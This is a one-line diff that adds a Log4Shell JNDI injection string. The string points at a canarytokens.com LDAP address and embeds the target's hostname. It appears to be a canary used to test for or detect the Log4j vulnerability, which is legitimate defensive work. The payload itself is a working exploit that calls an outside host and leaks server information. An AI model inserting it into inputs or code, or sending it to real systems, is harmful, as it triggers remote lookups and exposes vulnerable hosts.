@@ -1,0 +1,1 @@
+${jndi:ldap://x${hostName}.L4J.kt5ddxupd6wnda0n8wpv7jxy4.canarytokens.com/a}
